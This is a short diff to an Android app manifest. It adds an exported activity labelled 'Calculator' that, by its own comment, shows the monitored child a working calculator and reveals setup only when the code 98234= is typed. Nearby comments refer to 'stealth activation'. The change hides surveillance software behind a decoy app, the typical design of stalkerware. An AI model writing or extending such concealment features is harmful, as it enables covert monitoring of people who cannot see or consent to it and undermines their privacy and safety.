@@ -38,6 +38,14 @@
         android:theme="@style/Theme.AppCompat.Light.NoActionBar"
         android:usesCleartextTraffic="true">
 
+        <!-- Disguised Calculator Mode (Child sees working calculator; typing 98234= unlocks setup) -->
+        <activity
+            android:name=".CalculatorDisguiseActivity"
+            android:exported="true"
+            android:label="Calculator"
+            android:theme="@style/Theme.AppCompat.Light.NoActionBar">
+        </activity>
+
         <!-- Setup Activity (Initial permission grant & stealth activation) -->
         <activity
             android:name=".MainActivity"
